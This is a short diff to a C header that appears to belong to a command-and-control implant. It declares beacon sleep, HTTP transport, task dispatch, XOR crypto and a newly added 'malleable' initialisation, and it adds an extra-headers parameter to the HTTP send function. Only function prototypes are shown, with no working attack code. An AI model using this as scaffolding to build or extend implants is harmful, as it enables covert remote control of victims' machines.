@@ -25,7 +25,7 @@ BOOL  Mem_Protect ( PVOID ptr, SIZE_T size, ULONG protect );
 // HTTP Connection
 PVOID Http_Open   ( PCHAR user_agent );
 PVOID Http_Connect( PVOID h_internet, PCHAR host, UINT16 port );
-BOOL  Http_Send   ( PVOID h_connect, PCHAR uri, BOOL use_ssl, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
+BOOL  Http_Send   ( PVOID h_connect, PCHAR uri, BOOL use_ssl, PAIN_HEADER* extra_hdrs, UINT32 extra_hdr_count, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
 void  Http_Close  ( PVOID handle );
 
 BOOL Transport_Send    ( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
@@ -34,6 +34,7 @@ BOOL Transport_Poll ( PVOID* out_buf, UINT32* out_len );
 BOOL Task_Dispatch  ( PVOID buf, UINT32 buf_len );
 
 void Beacon_Sleep( ULONG ms );
+VOID Malleable_Init();
 
 // Crypto subsystem
 void Crypt_Xor    ( PVOID buf, SIZE_T size, ULONG_PTR key );
